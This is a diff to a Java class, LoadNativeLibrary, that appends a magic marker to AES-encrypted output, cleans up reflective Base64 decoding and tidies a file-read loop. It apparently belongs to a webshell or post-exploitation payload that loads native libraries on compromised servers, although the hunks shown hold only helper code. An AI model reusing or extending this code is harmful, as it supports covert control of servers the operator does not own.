@@ -200,7 +200,10 @@ public class LoadNativeLibrary implements Runnable {
       Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
       cipher.init(1, skeySpec);
       byte[] encrypted = cipher.doFinal(bs);
-      return encrypted;
+      ByteArrayOutputStream bos = new ByteArrayOutputStream();
+      bos.write(encrypted);
+      bos.write(this.getMagic());
+      return bos.toByteArray();
    }
 
    private String buildJson(Map entity, boolean encode) throws Exception {
@@ -272,12 +275,12 @@ public class LoadNativeLibrary implements Runnable {
          this.getClass();
          Base64 = Class.forName("java.util.Base64");
          Decoder = Base64.getMethod("getDecoder", (Class[])null).invoke(Base64, (Object[])null);
-         result = (byte[])((byte[])Decoder.getClass().getMethod("decode", String.class).invoke(Decoder, base64Text));
+         result = (byte[])Decoder.getClass().getMethod("decode", String.class).invoke(Decoder, base64Text);
       } else {
          this.getClass();
          Base64 = Class.forName("sun.misc.BASE64Decoder");
          Decoder = Base64.newInstance();
-         result = (byte[])((byte[])Decoder.getClass().getMethod("decodeBuffer", String.class).invoke(Decoder, base64Text));
+         result = (byte[])Decoder.getClass().getMethod("decodeBuffer", String.class).invoke(Decoder, base64Text);
       }
 
       return result;
@@ -323,7 +326,7 @@ public class LoadNativeLibrary implements Runnable {
       byte[] buffer = new byte[10240000];
 
       int length;
-      for(boolean var4 = false; (length = fis.read(buffer)) > 0; fileContent = mergeBytes(fileContent, Arrays.copyOfRange(buffer, 0, length))) {
+      for(length = 0; (length = fis.read(buffer)) > 0; fileContent = mergeBytes(fileContent, Arrays.copyOfRange(buffer, 0, length))) {
       }
 
       fis.close();
